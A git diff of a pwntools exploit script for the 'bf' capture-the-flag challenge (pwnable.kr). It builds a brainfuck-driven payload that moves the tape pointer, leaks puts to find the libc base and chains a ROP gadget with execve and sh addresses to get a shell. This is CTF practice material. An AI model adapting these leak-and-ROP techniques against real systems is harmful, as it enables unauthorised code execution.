@@ -5,14 +5,16 @@ context.update(arch="i386", os="linux")
 # Logging
 log.info("Start pwning...")
 
+#ELF_NAME = "./ctf-bf"
+ELF_NAME = "./bf"
 # Load executable
-exe = ELF("./bf")
-#exe = ELF("./ctf-bf")
+#exe = ELF("./bf")
+exe = ELF(ELF_NAME)
 
 # Libc
-libc = exe.libc
+libc = ELF("./libc.so.6")
 #libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
-libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
+libc_base = 0xf7e1b000 # Bf local one
 #libc_base = 0xf7d73000 # TODO - re-adjust base - I changed it cuz of gdb 
 #libc_base = 0xf7d73000 # The original base
 #libc_base = 0xf7df8000 # The original base
@@ -20,26 +22,15 @@ libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb
 libc.address = libc_base
 puts_addr = p32(next(libc.search(b"puts")))
 #execve_addr = p32(next(libc.search(b"libc_system")))
-puts_addr = libc.symbols["puts"]
-puts_plt = p32(exe.plt['puts'])
-#print(f"puts plt: {puts_plt}")
-
-rop = ROP(libc)
-rop_addr = rop.ebx.address
-#rop.execve(sh_addr,0,0)
-#my_rop = b'p\xb3\xec\xf7baaa\n\x00\x00\x00' # sleep 10
-#my_rop = b'\xc0\xb8\xec\xf7baaa+k\xf7\xf7\x10\x00\x00\x00/usr/bin/ls\x00' #ls
-#0x000183a5
 target = libc_base + 0x001134d9 # add to esp
 my_rop = p32(target)
 print(f"ROP: {my_rop}")
 
-print(f"ROP offset: {hex(rop.ebx.address)}")
 #print(f"DUMP: {my_rop.dump()}")
 # Start process
 #conn = remote("pwnable.kr",9001)
 #conn = process("./ctf-bf")
-conn = process("./bf")
+conn = process(ELF_NAME)
 #conn = gdb.debug("./bf",
 #env={"LD_PRELOAD":"./libc.so.6"}, gdbscript='''
 #br *0x8048717
@@ -68,6 +59,7 @@ new_esp_val = 0x12345678
 payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
 print(f"sh_addr: {str(sh_addr)}")
 payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
+payload += b".>.>.>." # leak the address of libc
 #payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 payload += b",>,>,>," # putchar - for sending the last char
 payload += b"[" # call to puts()
@@ -79,13 +71,8 @@ with open("payload", "wb+") as f:
     f.write(payload)
 # separate sends cuz of annoying encoding / decoding issue with p32() and
 # strings
-#pop_eax_address = libc_base + 0x0002407e
-#print(f" POP: {hex(pop_eax_address)}")
-#payload = p32(pop_eax_address) # pop eax  - I might need to call it like 0x128
-#payload = bytes(my_rop)
 payload = my_rop
 #payload = p32(0xf7e55db0) # system()
-#payload += my_rop # pop eax  - I might need to call it like 0x128
 payload +=b"\n"
 conn.send(payload)
 with open("payload", "ab+") as f:
@@ -97,16 +84,20 @@ with open("payload", "ab+") as f:
 #payload = payload.encode().replace('\\n','\n')
 print(payload)
 
-got_check = p64(exe.got['puts']) # the function address in GOT
+print(conn.recvline()) # main massage
+print(conn.recvline()) # main massage 2
+puts_addr = unpack(conn.recv(), endian='little')
+print(f"puts addr: {puts_addr}") # receive until newline
+print(f"puts addr: {hex(puts_addr)}") # receive until newline
+puts_distance_from_libc = 392368
+print(f"distance: {puts_distance_from_libc}")
+libc_addr = puts_addr - puts_distance_from_libc
+print(f"libc addr: {libc_addr}") # receive until newline
+print(f"libc addr: {hex(libc_addr)}") # receive until newline
 
-print(f"got addr: {got_check}, puts: {puts_addr}")
-
-print(conn.recvline()) # receive until newline
-#print(conn.recvline()) # receive until newline
-output = conn.recv()
-print(f"Program output: {output}") # receive until newline
+#print(f"Program output: {output}") # receive until newline
 #conn.send("ls\n")
-conn.interactive()
+#conn.interactive()
 #output = conn.recvline()
 #output += conn.recvline()
 #output += conn.recvline()
